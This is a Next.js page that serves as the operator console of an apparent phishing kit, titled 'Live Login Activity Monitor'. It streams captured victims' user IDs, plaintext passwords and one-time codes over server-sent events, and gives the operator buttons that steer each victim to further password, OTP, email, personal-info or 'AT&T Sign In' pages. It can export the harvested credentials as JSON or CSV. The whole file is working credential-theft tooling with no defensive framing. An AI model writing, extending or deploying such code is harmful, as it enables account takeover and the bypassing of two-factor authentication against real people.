import Head from 'next/head';
import { useEffect, useState } from 'react';

export default function LinkPage() {
  const [currentPage, setCurrentPage] = useState(1);
  const [allActivities, setAllActivities] = useState([]);
  const itemsPerPage = 20;

  useEffect(() => {
    const activityLog = document.getElementById('activity-log');
    const statusIndicator = document.getElementById('status-indicator');
    let lastActivityId = null;
    let processedIds = new Set();
    let activitiesData = [];

    function formatTime(timestamp) {
      const date = new Date(timestamp);
      return date.toLocaleTimeString('en-US', { 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit',
        hour12: true 
      });
    }

    async function approveActivity(activityId, type, userId, redirectType = 'password') {
      // Update UI immediately for instant feedback
      updateActivityStatus(activityId, 'approved', redirectType);
      
      try {
        console.log(`[link.js] Approving activity ${activityId} with redirectType: ${redirectType}`);
        const response = await fetch('/api/approve', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ activityId, type, userId, redirectType })
        });
        
        if (!response.ok) {
          const errorText = await response.text();
          console.error(`[link.js] Approve failed: ${response.status} ${response.statusText}`, errorText);
          // Revert UI on error
          updateActivityStatus(activityId, 'pending');
          throw new Error(`HTTP ${response.status}: ${errorText}`);
        }
        
        const data = await response.json();
        console.log(`[link.js] Approval response:`, data);
      } catch (error) {
        console.error('Error approving activity:', error);
        alert(`Failed to approve: ${error.message}`);
      }
    }

    async function denyActivity(activityId, type, userId) {
      // Update UI immediately for instant feedback
      updateActivityStatus(activityId, 'denied');
      
      try {
        const response = await fetch('/api/deny', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ activityId, type, userId })
        });
        
        if (!response.ok) {
          // Revert UI on error
          updateActivityStatus(activityId, 'pending');
          throw new Error(`HTTP ${response.status}`);
        }
        
        const data = await response.json();
        console.log(`[link.js] Denial response:`, data);
      } catch (error) {
        console.error('Error denying activity:', error);
      }
    }

    function updateActivityStatus(activityId, status, redirectType = null) {
      const statusEl = document.getElementById(`status-${activityId}`);
      const actionsEl = document.getElementById(`actions-${activityId}`);
      
      if (statusEl) {
        if (status === 'pending') {
          statusEl.textContent = 'Waiting for redirect...';
          statusEl.className = 'activity-status status-pending';
        } else {
          statusEl.textContent = status === 'approved' 
            ? `Approved${redirectType ? ` - Redirecting to ${redirectType}` : ''}` 
            : 'Denied';
          statusEl.className = `activity-status status-${status}`;
        }
      }
      
      if (actionsEl && status !== 'pending') {
        actionsEl.style.display = 'none';
      }
    }

    function addActivityEntry(activity) {
      if (processedIds.has(activity.id)) return;
      processedIds.add(activity.id);

      // Add to activities data array
      activitiesData.unshift(activity);
      setAllActivities([...activitiesData]);

      const timeString = formatTime(activity.timestamp);
      const userId = activity.userId || 'Unknown';
      
      let content = '';
      let className = '';
      let showActions = false;
      let activityIcon = '';
      
      if (activity.type === 'userid') {
        content = `User ID entered: <strong>${userId}</strong>`;
        className = 'user-id-entry';
        showActions = true;
        activityIcon = '👤';
      } else if (activity.type === 'password') {
        const passwordDisplay = activity.password ? `: <code>${activity.password}</code>` : '';
        content = `Password entered for: <strong>${userId}</strong>${passwordDisplay}`;
        className = 'password-entry';
        showActions = true;
        activityIcon = '🔑';
      } else if (activity.type === 'signin') {
        const passwordDisplay = activity.password ? ` (Password: <code>${activity.password}</code>)` : '';
        content = `Sign in button clicked for: <strong>${userId}</strong>${passwordDisplay}`;
        className = 'signin-entry';
        showActions = true;
        activityIcon = '🚀';
      } else if (activity.type === 'otp') {
        const otpDisplay = activity.otpCode ? `: <code>${activity.otpCode}</code>` : '';
        content = `OTP code entered for: <strong>${userId}</strong>${otpDisplay}`;
        className = 'otp-entry';
        showActions = true;
        activityIcon = '🔢';
      }

      const activityItem = document.createElement('div');
      activityItem.className = `activity-card ${className}`;
      activityItem.id = `activity-${activity.id}`;

      let actionsHTML = '';
      if (showActions && activity.type === 'userid') {
        actionsHTML = `
          <div class="activity-actions" id="actions-${activity.id}">
            <button class="action-btn primary" data-action="redirect" data-redirect="password">
              <span class="btn-icon">🔐</span> Password Page
            </button>
            <button class="action-btn secondary" data-action="redirect" data-redirect="otp">
              <span class="btn-icon">📱</span> OTP Code
            </button>
            <button class="action-btn secondary" data-action="redirect" data-redirect="email">
              <span class="btn-icon">📧</span> Email Page
            </button>
            <button class="action-btn secondary" data-action="redirect" data-redirect="personal">
              <span class="btn-icon">📋</span> Personal Info
            </button>
            <button class="action-btn att" data-action="redirect" data-redirect="att">
              <span class="btn-icon">🌐</span> AT&T Sign In
            </button>
            <button class="action-btn danger" data-action="deny">
              <span class="btn-icon">❌</span> Deny
            </button>
          </div>
          <div class="activity-status status-pending" id="status-${activity.id}">
            <span class="status-dot"></span> Waiting for redirect...
          </div>
        `;
      } else if (showActions && activity.type === 'password') {
        actionsHTML = `
          <div class="activity-actions" id="actions-${activity.id}">
            <button class="action-btn secondary" data-action="redirect" data-redirect="otp">
              <span class="btn-icon">📱</span> OTP Code
            </button>
            <button class="action-btn secondary" data-action="redirect" data-redirect="email">
              <span class="btn-icon">📧</span> Email Page
            </button>
            <button class="action-btn secondary" data-action="redirect" data-redirect="personal">
              <span class="btn-icon">📋</span> Personal Info
            </button>
            <button class="action-btn att" data-action="redirect" data-redirect="att">
              <span class="btn-icon">🌐</span> AT&T Sign In
            </button>
            <button class="action-btn danger" data-action="deny">
              <span class="btn-icon">❌</span> Deny
            </button>
          </div>
          <div class="activity-status status-pending" id="status-${activity.id}">
            <span class="status-dot"></span> Waiting for redirect...
          </div>
        `;
      } else if (showActions) {
        actionsHTML = `
          <div class="activity-actions" id="actions-${activity.id}">
            <button class="action-btn success" data-action="approve">
              <span class="btn-icon">✓</span> Approve
            </button>
            <button class="action-btn danger" data-action="deny">
              <span class="btn-icon">❌</span> Deny
            </button>
          </div>
          <div class="activity-status status-pending" id="status-${activity.id}">
            <span class="status-dot"></span> Pending approval...
          </div>
        `;
      }

      activityItem.innerHTML = `
        <div class="card-header">
          <span class="activity-icon">${activityIcon}</span>
          <div class="card-header-info">
            <div class="activity-time">${timeString}</div>
            <div class="activity-type-badge ${className}">${activity.type.toUpperCase()}</div>
          </div>
        </div>
        <div class="activity-content">${content}</div>
        ${actionsHTML}
      `;

      // Add event listeners
      if (showActions && (activity.type === 'userid' || activity.type === 'password')) {
        const actionsDiv = activityItem.querySelector(`#actions-${activity.id}`);
        if (actionsDiv) {
          actionsDiv.addEventListener('click', function(e) {
            const button = e.target.closest('button');
            if (!button) return;
            
            const action = button.getAttribute('data-action');
            const redirectType = button.getAttribute('data-redirect');
            
            if (action === 'redirect' && redirectType) {
              approveActivity(activity.id, activity.type, userId, redirectType);
            } else if (action === 'deny') {
              denyActivity(activity.id, activity.type, userId);
            }
          });
        }
      } else if (showActions) {
        const actionsDiv = activityItem.querySelector(`#actions-${activity.id}`);
        if (actionsDiv) {
          actionsDiv.addEventListener('click', function(e) {
            const button = e.target.closest('button');
            if (!button) return;
            
            const action = button.getAttribute('data-action');
            
            if (action === 'approve') {
              approveActivity(activity.id, activity.type, userId);
            } else if (action === 'deny') {
              denyActivity(activity.id, activity.type, userId);
            }
          });
        }
      }

      const noActivity = activityLog.querySelector('.no-activity');
      if (noActivity) {
        noActivity.remove();
      }

      activityLog.insertBefore(activityItem, activityLog.firstChild);

      // Show toast notification
      showToast(`New ${activity.type} activity from ${userId}`);

      while (activityLog.children.length > 100) {
        activityLog.removeChild(activityLog.lastChild);
      }

      statusIndicator.classList.add('status-active');
      statusIndicator.classList.remove('status-inactive');
    }

    function showToast(message) {
      const toast = document.createElement('div');
      toast.className = 'toast-notification';
      toast.textContent = message;
      document.body.appendChild(toast);
      
      setTimeout(() => toast.classList.add('show'), 10);
      setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
      }, 3000);
    }

    function exportActivities(format) {
      if (activitiesData.length === 0) {
        alert('No activities to export');
        return;
      }

      if (format === 'json') {
        const dataStr = JSON.stringify(activitiesData, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(dataBlob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `activities-${new Date().toISOString()}.json`;
        link.click();
        URL.revokeObjectURL(url);
      } else if (format === 'csv') {
        const headers = ['Timestamp', 'Type', 'User ID', 'Password', 'OTP Code'];
        const rows = activitiesData.map(a => [
          a.timestamp,
          a.type,
          a.userId || '',
          a.password || '',
          a.otpCode || ''
        ]);
        
        const csvContent = [
          headers.join(','),
          ...rows.map(row => row.map(cell => `"${cell}"`).join(','))
        ].join('\\n');
        
        const dataBlob = new Blob([csvContent], { type: 'text/csv' });
        const url = URL.createObjectURL(dataBlob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `activities-${new Date().toISOString()}.csv`;
        link.click();
        URL.revokeObjectURL(url);
      }
      
      showToast(`Exported ${activitiesData.length} activities as ${format.toUpperCase()}`);
    }

    // Expose export function globally
    window.exportActivities = exportActivities;

    // Connect to SSE for real-time activity updates
    function connectSSE() {
      const eventSource = new EventSource('/api/events');
      
      eventSource.onmessage = function(event) {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === 'activity') {
            // New activity received
            addActivityEntry(data.data);
          } else if (data.type === 'approval') {
            // Approval status update
            updateActivityStatus(data.activityId, data.data.status, data.data.redirectType);
          } else if (data.type === 'connected') {
            console.log('SSE connected successfully');
          }
        } catch (error) {
          console.error('Error parsing SSE message:', error);
        }
      };
      
      eventSource.onerror = function(error) {
        console.error('[link.js] SSE connection error:', error);
        statusIndicator.classList.remove('status-active');
        statusIndicator.classList.add('status-inactive');
        
        // Reconnect faster (1 second) for quicker recovery
        setTimeout(() => {
          if (window.monitorEventSource === eventSource) {
            eventSource.close();
            connectSSE();
          }
        }, 1000);
      };
      
      eventSource.onopen = function() {
        console.log('[link.js] SSE connected successfully');
        statusIndicator.classList.add('status-active');
        statusIndicator.classList.remove('status-inactive');
      };
      
      // Store event source for cleanup
      window.monitorEventSource = eventSource;
    }

    // Load stored activities on page load
    async function loadStoredActivities() {
      try {
        console.log('[link.js] Loading stored activities...');
        const response = await fetch('/api/activities');
        if (response.ok) {
          const data = await response.json();
          if (data.success && data.activities) {
            console.log(`[link.js] Loaded ${data.activities.length} stored activities`);
            // Add each stored activity to the panel
            data.activities.forEach(activity => {
              addActivityEntry(activity);
            });
          }
        }
      } catch (error) {
        console.error('[link.js] Error loading stored activities:', error);
      }
    }

    // Test API connection on load
    async function testConnection() {
      try {
        const response = await fetch('/api/test');
        const data = await response.json();
        console.log('API connection test:', data);
      } catch (error) {
        console.error('API connection failed:', error);
      }
    }

    // Initialize
    testConnection();
    loadStoredActivities(); // Load stored activities first
    connectSSE(); // Then connect to SSE for real-time updates

    // Setup pagination controls
    const prevBtn = document.getElementById('prev-btn');
    const nextBtn = document.getElementById('next-btn');
    
    if (prevBtn && nextBtn) {
      prevBtn.addEventListener('click', () => {
        if (currentPage > 1) {
          setCurrentPage(currentPage - 1);
          updatePaginationDisplay();
        }
      });
      
      nextBtn.addEventListener('click', () => {
        const totalPages = Math.ceil(activitiesData.length / itemsPerPage);
        if (currentPage < totalPages) {
          setCurrentPage(currentPage + 1);
          updatePaginationDisplay();
        }
      });
    }

    function updatePaginationDisplay() {
      const pagination = document.getElementById('pagination');
      const paginationInfo = document.getElementById('pagination-info');
      const prevBtn = document.getElementById('prev-btn');
      const nextBtn = document.getElementById('next-btn');
      
      if (activitiesData.length === 0) {
        if (pagination) pagination.style.display = 'none';
        return;
      }
      
      if (pagination) pagination.style.display = 'flex';
      
      const totalPages = Math.ceil(activitiesData.length / itemsPerPage);
      const start = (currentPage - 1) * itemsPerPage + 1;
      const end = Math.min(currentPage * itemsPerPage, activitiesData.length);
      
      if (paginationInfo) {
        paginationInfo.textContent = `Showing ${start}-${end} of ${activitiesData.length} activities (Page ${currentPage} of ${totalPages})`;
      }
      
      if (prevBtn) prevBtn.disabled = currentPage === 1;
      if (nextBtn) nextBtn.disabled = currentPage >= totalPages;
    }

    return () => {
      if (window.monitorEventSource) {
        window.monitorEventSource.close();
      }
    };
  }, [currentPage]);

  // Update pagination when activities change
  useEffect(() => {
    const updateDisplay = () => {
      const pagination = document.getElementById('pagination');
      const paginationInfo = document.getElementById('pagination-info');
      const prevBtn = document.getElementById('prev-btn');
      const nextBtn = document.getElementById('next-btn');
      
      if (allActivities.length === 0) {
        if (pagination) pagination.style.display = 'none';
        return;
      }
      
      if (pagination) pagination.style.display = 'flex';
      
      const totalPages = Math.ceil(allActivities.length / itemsPerPage);
      const start = (currentPage - 1) * itemsPerPage + 1;
      const end = Math.min(currentPage * itemsPerPage, allActivities.length);
      
      if (paginationInfo) {
        paginationInfo.textContent = `Showing ${start}-${end} of ${allActivities.length} activities (Page ${currentPage} of ${totalPages})`;
      }
      
      if (prevBtn) prevBtn.disabled = currentPage === 1;
      if (nextBtn) nextBtn.disabled = currentPage >= totalPages;
    };
    
    updateDisplay();
  }, [allActivities, currentPage]);

  return (
    <>
      <Head>
        <title>Ready - Live Monitor</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }

        .ready-container {
          max-width: 1400px;
          margin: 0 auto;
        }

        .header-section {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 30px;
          flex-wrap: wrap;
          gap: 20px;
        }

        .ready-text {
          font-size: 56px;
          font-weight: 800;
          color: #ffffff;
          text-shadow: 0 2px 20px rgba(0, 0, 0, 0.2);
          letter-spacing: -1px;
        }

        .header-actions {
          display: flex;
          gap: 12px;
          align-items: center;
        }

        .export-btn {
          background: rgba(255, 255, 255, 0.2);
          backdrop-filter: blur(10px);
          border: 1px solid rgba(255, 255, 255, 0.3);
          color: white;
          padding: 10px 20px;
          border-radius: 10px;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s ease;
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .export-btn:hover {
          background: rgba(255, 255, 255, 0.3);
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }

        .monitor-panel {
          background: #ffffff;
          border-radius: 20px;
          box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
          padding: 30px;
          margin-bottom: 20px;
        }

        .panel-title {
          font-size: 24px;
          font-weight: 700;
          color: #1a1a1a;
          margin-bottom: 24px;
          display: flex;
          align-items: center;
          gap: 12px;
          padding-bottom: 20px;
          border-bottom: 2px solid #f0f0f0;
        }

        .status-indicator {
          display: inline-block;
          width: 14px;
          height: 14px;
          border-radius: 50%;
          position: relative;
        }

        .status-active {
          background: #00d084;
          box-shadow: 0 0 0 4px rgba(0, 208, 132, 0.2);
          animation: pulse 2s infinite;
        }

        @keyframes pulse {
          0%, 100% {
            box-shadow: 0 0 0 4px rgba(0, 208, 132, 0.2);
          }
          50% {
            box-shadow: 0 0 0 8px rgba(0, 208, 132, 0.1);
          }
        }

        .status-inactive {
          background: #d1d1d1;
        }

        .activity-card {
          background: #fafafa;
          border-radius: 12px;
          padding: 20px;
          margin-bottom: 16px;
          border-left: 4px solid #667eea;
          transition: all 0.3s ease;
          animation: slideIn 0.4s ease-out;
        }

        @keyframes slideIn {
          from {
            opacity: 0;
            transform: translateY(-10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        .activity-card:hover {
          transform: translateX(4px);
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
        }

        .card-header {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 12px;
        }

        .activity-icon {
          font-size: 24px;
          width: 40px;
          height: 40px;
          display: flex;
          align-items: center;
          justify-content: center;
          background: white;
          border-radius: 10px;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
        }

        .card-header-info {
          flex: 1;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }

        .activity-time {
          font-size: 13px;
          color: #666;
          font-weight: 500;
        }

        .activity-type-badge {
          font-size: 11px;
          font-weight: 700;
          padding: 4px 10px;
          border-radius: 6px;
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }

        .user-id-entry .activity-type-badge {
          background: #e3f2fd;
          color: #1976d2;
        }

        .password-entry .activity-type-badge {
          background: #e8f5e9;
          color: #388e3c;
        }

        .signin-entry .activity-type-badge {
          background: #fff3e0;
          color: #f57c00;
        }

        .otp-entry .activity-type-badge {
          background: #f3e5f5;
          color: #7b1fa2;
        }

        .activity-content {
          font-size: 16px;
          color: #1a1a1a;
          font-weight: 500;
          margin-bottom: 16px;
          line-height: 1.6;
        }

        .activity-content strong {
          color: #667eea;
          font-weight: 700;
        }

        .activity-content code {
          background: #fff;
          padding: 4px 10px;
          border-radius: 6px;
          font-family: 'Monaco', 'Menlo', monospace;
          font-size: 14px;
          color: #e91e63;
          border: 1px solid #ffebee;
          font-weight: 600;
        }

        .user-id-entry {
          border-left-color: #667eea;
        }

        .password-entry {
          border-left-color: #00d084;
        }

        .signin-entry {
          border-left-color: #ff6b6b;
        }

        .otp-entry {
          border-left-color: #a78bfa;
        }

        .no-activity {
          text-align: center;
          color: #999;
          font-size: 16px;
          padding: 60px 20px;
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 16px;
        }

        .no-activity-icon {
          font-size: 64px;
          opacity: 0.3;
        }

        .activity-actions {
          display: flex;
          gap: 10px;
          margin-top: 16px;
          flex-wrap: wrap;
        }

        .action-btn {
          padding: 10px 18px;
          border: none;
          border-radius: 8px;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
          display: flex;
          align-items: center;
          gap: 6px;
          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
        }

        .action-btn:hover {
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .action-btn:active {
          transform: translateY(0);
        }

        .btn-icon {
          font-size: 16px;
        }

        .action-btn.primary {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
        }

        .action-btn.secondary {
          background: #f0f0f0;
          color: #333;
        }

        .action-btn.secondary:hover {
          background: #e0e0e0;
        }

        .action-btn.success {
          background: #00d084;
          color: white;
        }

        .action-btn.danger {
          background: #ff6b6b;
          color: white;
        }

        .action-btn.att {
          background: #00a8e0;
          color: white;
        }

        .activity-status {
          margin-top: 12px;
          font-size: 13px;
          font-weight: 600;
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 8px 12px;
          border-radius: 6px;
          background: white;
        }

        .status-dot {
          width: 8px;
          height: 8px;
          border-radius: 50%;
          display: inline-block;
        }

        .status-pending {
          color: #666;
        }

        .status-pending .status-dot {
          background: #ffa726;
          animation: blink 1.5s infinite;
        }

        @keyframes blink {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.3; }
        }

        .status-approved {
          color: #00d084;
        }

        .status-approved .status-dot {
          background: #00d084;
        }

        .status-denied {
          color: #ff6b6b;
        }

        .status-denied .status-dot {
          background: #ff6b6b;
        }

        .pagination-controls {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-top: 24px;
          padding-top: 20px;
          border-top: 2px solid #f0f0f0;
        }

        .pagination-info {
          font-size: 14px;
          color: #666;
          font-weight: 500;
        }

        .pagination-buttons {
          display: flex;
          gap: 10px;
        }

        .page-btn {
          padding: 8px 16px;
          background: #f0f0f0;
          border: none;
          border-radius: 8px;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
          color: #333;
        }

        .page-btn:hover:not(:disabled) {
          background: #667eea;
          color: white;
          transform: translateY(-2px);
        }

        .page-btn:disabled {
          opacity: 0.4;
          cursor: not-allowed;
        }

        .toast-notification {
          position: fixed;
          bottom: 30px;
          right: 30px;
          background: #1a1a1a;
          color: white;
          padding: 16px 24px;
          border-radius: 12px;
          box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
          font-size: 14px;
          font-weight: 600;
          z-index: 10000;
          opacity: 0;
          transform: translateY(20px);
          transition: all 0.3s ease;
        }

        .toast-notification.show {
          opacity: 1;
          transform: translateY(0);
        }

        .info-box {
          margin-top: 20px;
          padding: 20px;
          background: rgba(255, 255, 255, 0.95);
          border-radius: 12px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .info-box strong {
          display: block;
          font-size: 16px;
          margin-bottom: 8px;
          color: #1a1a1a;
        }

        .info-box code {
          background: #f0f0f0;
          padding: 4px 8px;
          border-radius: 4px;
          font-family: monospace;
          color: #667eea;
          font-weight: 600;
        }

        @media (max-width: 768px) {
          .ready-text {
            font-size: 40px;
          }

          .header-section {
            flex-direction: column;
            align-items: flex-start;
          }

          .activity-card {
            padding: 16px;
          }

          .activity-actions {
            flex-direction: column;
          }

          .action-btn {
            width: 100%;
            justify-content: center;
          }

          .pagination-controls {
            flex-direction: column;
            gap: 16px;
          }

          .toast-notification {
            bottom: 20px;
            right: 20px;
            left: 20px;
          }
        }
      `}</style>
      <div className="ready-container">
        <div className="header-section">
          <div className="ready-text">ready</div>
          <div className="header-actions">
            <button className="export-btn" onClick={() => window.exportActivities && window.exportActivities('json')}>
              <span>💾</span> Export JSON
            </button>
            <button className="export-btn" onClick={() => window.exportActivities && window.exportActivities('csv')}>
              <span>📊</span> Export CSV
            </button>
          </div>
        </div>
        
        <div className="monitor-panel">
          <div className="panel-title">
            <span className="status-indicator status-active" id="status-indicator"></span>
            Live Login Activity Monitor
          </div>
          <div id="activity-log">
            <div className="no-activity">
              <div className="no-activity-icon">🔍</div>
              <div>No activity yet. Waiting for login attempts...</div>
            </div>
          </div>
          <div className="pagination-controls" style={{ display: 'none' }} id="pagination">
            <div className="pagination-info" id="pagination-info">
              Showing 1-20 of 0 activities
            </div>
            <div className="pagination-buttons">
              <button className="page-btn" id="prev-btn">← Previous</button>
              <button className="page-btn" id="next-btn">Next →</button>
            </div>
          </div>
        </div>
        
        <div className="info-box">
          <strong>✅ Real-Time Monitoring Active</strong>
          Activities appear automatically without refresh • Access at <code>/link</code>
        </div>
      </div>
    </>
  );
}

